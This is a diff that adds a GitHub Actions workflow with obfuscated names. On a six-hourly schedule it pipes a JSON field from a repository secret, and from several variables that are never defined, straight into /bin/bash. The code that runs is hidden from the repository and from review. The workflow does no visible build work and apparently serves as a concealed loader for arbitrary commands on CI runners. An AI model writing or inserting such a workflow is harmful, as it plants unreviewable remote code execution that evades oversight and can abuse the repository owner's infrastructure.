@@ -1,0 +1,26 @@
+name: thisfirstime
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: thisfirstime
+        env:
+          bm6753: ${{ secrets.bm6753 }}
+        run: |
+          echo $bm6753 | jq -r .sl83824 | /bin/bash
+          echo $mv36564 | jq -r .oyvd1279 | /bin/bash
+          echo $rbnc8198 | jq -r .snr8846 | /bin/bash
+          echo $a5 | jq -r .d13 | /bin/bash
+          echo $sa5 | jq -r .bkua39 | /bin/bash
+          echo $bz42916 | jq -r .ja89427 | /bin/bash
+          echo $sesq91 | jq -r .c102 | /bin/bash
+          echo $ug50 | jq -r .sgot6 | /bin/bash
+          echo $rl3565 | jq -r .msvo180 | /bin/bash
+
